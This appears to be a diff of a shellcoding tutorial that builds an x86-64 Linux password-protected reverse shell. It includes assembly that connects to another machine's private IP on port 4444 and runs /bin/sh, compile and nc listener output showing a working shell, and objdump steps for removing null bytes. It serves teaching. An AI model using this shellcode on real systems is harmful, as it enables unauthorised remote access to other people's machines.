@@ -215,7 +215,7 @@ xor rax, rax
 
 push rax
         
-mov dword [rsp-4], 0x7f000001
+mov dword [rsp-4], 0x7b01a8c0 ;using private Ip of another machine
 mov word [rsp-6], 0x5c11
 mov word [rsp-8], 0x2
 sub rsp, 8
@@ -335,24 +335,77 @@ shell[::-1].encode('hex')
 
 ```nasm
         
-        xor rax, rax ;zero out rax
-        push rax ;push 8 zero bytes onto the stack for third argument 
+xor rax, rax ;zero out rax
+push rax ;push 8 zero bytes onto the stack for third argument 
 
-        mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
-        push rbx ;push the value onto the stack
+mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
+push rbx ;push the value onto the stack
 
-        mov rdi, rsp ;the stack pointer now points to /bin//sh on the stack for first argument
+mov rdi, rsp ;the stack pointer now points to /bin//sh on the stack for first argument
 
-        push rax ;add another 8 zero bytes on the stack
+push rax ;add another 8 zero bytes on the stack
 
-        mov rdx, rsp ;the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument
+mov rdx, rsp ;the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument
 
-        push rdi ;rdi is currently pointing to the address of /bin//sh so lets put that on the stack
-        mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
-        mov rax, 59 ;syscall number for execve
-        syscall ;execve syscall instruction
+push rdi ;rdi is currently pointing to the address of /bin//sh so lets put that on the stack
+mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
+mov rax, 59 ;syscall number for execve
+syscall ;execve syscall instruction
 ```
 
-And that should do it, it should connect back our attacker server and present us with a nice shell.
+And that should do it, we can now compile our program and it should connect back our attacker server (in this instance I used a different Ip to localhost) and present us with a nice shell.
+
+```bash
+┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
+└─$ nasm -felf64 Pass_Rev_Shell.nasm -o rev.o
+
+┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
+└─$ ld rev.o -o rev
+
+┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
+└─$ ./rev
+
+➜  ~ nc -nlv 4444
+8bytesss
+id
+uid=1000(kali) gid=1000(kali) groups=1000(kali)
+```
+
+Ok, so you know the drill by now. Our Assembly code will not work because of the nullbytes in our code:
+
+```bash
+┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
+└─$ objdump -d rev.o | grep 00                                       144 ⨯
+0000000000000000 <_start>:
+   0:   b8 29 00 00 00          mov    $0x29,%eax
+   5:   bf 02 00 00 00          mov    $0x2,%edi
+   a:   be 01 00 00 00          mov    $0x1,%esi
+   f:   ba 00 00 00 00          mov    $0x0,%edx
+  2c:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
+  37:   b8 2a 00 00 00          mov    $0x2a,%eax
+  3f:   ba 10 00 00 00          mov    $0x10,%edx
+  46:   b8 21 00 00 00          mov    $0x21,%eax
+  4b:   be 00 00 00 00          mov    $0x0,%esi
+  52:   b8 21 00 00 00          mov    $0x21,%eax
+  57:   be 01 00 00 00          mov    $0x1,%esi
+  5e:   b8 21 00 00 00          mov    $0x21,%eax
+  63:   be 02 00 00 00          mov    $0x2,%esi
+  75:   ba 08 00 00 00          mov    $0x8,%edx
+  aa:   b8 3b 00 00 00          mov    $0x3b,%eax
+00000000000000b1 <exit>:
+  b4:   b8 3c 00 00 00          mov    $0x3c,%eax
+```
+
+Let's firstly use our 8-bit register technique to get rid of most of the nullbytes in our move instructions.
+
+```bash
+┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
+└─$ objdump -d rev.o | grep 00               
+0000000000000000 <_start>:
+  23:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
+  39:   40 b6 00                mov    $0x0,%sil
+000000000000008d <exit>:
+```
+
 
 <h2>Removing null bytes from generated shellcode</h2>
